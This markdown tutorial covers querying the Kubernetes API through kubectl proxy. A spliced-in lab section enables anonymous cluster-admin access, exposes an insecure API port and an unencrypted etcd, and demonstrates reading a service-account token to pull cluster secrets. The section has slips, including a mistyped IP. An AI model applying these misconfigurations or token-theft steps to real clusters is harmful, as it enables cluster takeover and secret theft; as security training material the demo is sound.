# Demo: Talking to the Kubernetes API Server via `kubectl proxy`

The `kubectl proxy` command runs a local HTTP proxy that forwards requests to the **Kubernetes API Server** using your current `kubectl` context and credentials.  
This allows you to explore and interact with the API without worrying about TLS certs or tokens.

---

## 1. Start the Proxy

```bash
kubectl proxy --port=8001
````

Output:

```
Starting to serve on 127.0.0.1:8001
```

Now the API Server is accessible at:

```
http://127.0.0.1:8001/
```

---

## 2. Explore the API Root

```bash
curl http://127.0.0.1:8001/
```

Example response:

```json
{
  "paths": [
    "/api",
    "/apis",
    "/healthz",
    "/metrics",
    "/openapi/v2"
  ]
}
```

---
## Enable Anonymous Access (Misconfig)
ETCD Direct Access
```bash
# vi /etc/kubernetes/manifests/kube-apiserver.yaml
- --anonymous-auth=true
- --insecure-port=8080
- --insecure-bind-address=0.0.0.0

#crictl ps (Check all pods are up)
```

## Create a ClusterRoleBinding for anonymous
```bash
# kubectl create clusterrolebinding anonymous-admin \
  --clusterrole=cluster-admin \
  --user=system:anonymous
```
## Retry curl
```bash
# curl -k https://192.168.0.114:6443/api/v1/namespaces/default/pods
```
## Accessing the Insecure Port
```bash
curl http://192.168.0.114:8080/api/v1/namespaces/default/pods
```
## Clean Up (VERY IMPORTANT)
```bash
# kubectl delete clusterrolebinding anonymous-admin
```
## Over-Privileged Service Account
#### Bind default service account to admin
```bash
kubectl create clusterrolebinding sa-admin \
  --clusterrole=cluster-admin \
  --serviceaccount=default:default
```

#### Attack (inside a pod)
```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -k -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/secrets
```

## ETCD Direct Access
#### Expose etcd without TLS
```bash
--listen-client-urls=http://0.0.0.0:2379

echo "L3JlZ2lzdHJ5L25hbWVzcGFjZXM=" | base64 -d
echo "L3JlZ2lzdHJ5L25hbWVzcGFjZXN0" | base64 -d

curl -s http://192.158.0.114:2379/v3/kv/range \
  -X POST -d '{
    "key": "L3JlZ2lzdHJ5L25hbWVzcGFjZXM=",
    "range_end": "L3JlZ2lzdHJ5L25hbWVzcGFjZXN0"
  }'
```

## 3. List Cluster Resources

### List all namespaces

```bash
curl http://127.0.0.1:8001/api/v1/namespaces
```

### List all nodes

```bash
curl http://127.0.0.1:8001/api/v1/nodes
```

### List all pods in default namespace

```bash
curl http://127.0.0.1:8001/api/v1/namespaces/default/pods
```

---

## 4. Work With Specific Namespaces

### Get services in `kube-system`

```bash
curl http://127.0.0.1:8001/api/v1/namespaces/kube-system/services
```

### Describe a specific pod

```bash
curl http://127.0.0.1:8001/api/v1/namespaces/default/pods/<pod-name>
```

---

## 5. Access Services via API Proxy

You can route requests **through the API Server** to reach cluster Services.

### Example: Talk to `kube-dns`

```bash
curl http://127.0.0.1:8001/api/v1/namespaces/kube-system/services/kube-dns:dns/proxy
```

### Example: Access Kubernetes Dashboard (if installed)

```bash
http://127.0.0.1:8001/api/v1/namespaces/kubernetes-dashboard/services/https:kubernetes-dashboard:/proxy/
```

---

## 6. Useful Endpoints

* API discovery:

  ```bash
  curl http://127.0.0.1:8001/apis
  ```
* Health check:

  ```bash
  curl http://127.0.0.1:8001/healthz
  ```
* Metrics (for Prometheus scraping):

  ```bash
  curl http://127.0.0.1:8001/metrics
  ```
* OpenAPI schema:

  ```bash
  curl http://127.0.0.1:8001/openapi/v2
  ```

---

## 7. Bonus: Interact with Pods via Proxy

You can exec or port-forward through API calls as well. Example:

### Logs of a pod

```bash
curl http://127.0.0.1:8001/api/v1/namespaces/default/pods/<pod-name>/log
```

### Port-forward a pod (via API call through proxy)

```bash
curl -X POST \
  http://127.0.0.1:8001/api/v1/namespaces/default/pods/<pod-name>/portforward
```

---

## 8. Stop the Proxy

Press:

```
CTRL + C
```

---

## 9. Key Takeaways

* `kubectl proxy` = Local HTTP proxy → API Server
* No need to handle TLS certs or tokens manually
* Lets you explore:

  * `/api` → Core resources
  * `/apis` → Grouped resources
  * `/metrics`, `/openapi/v2`, `/healthz`
* Can **proxy into Services and Pods** without exposing them externally

---

```
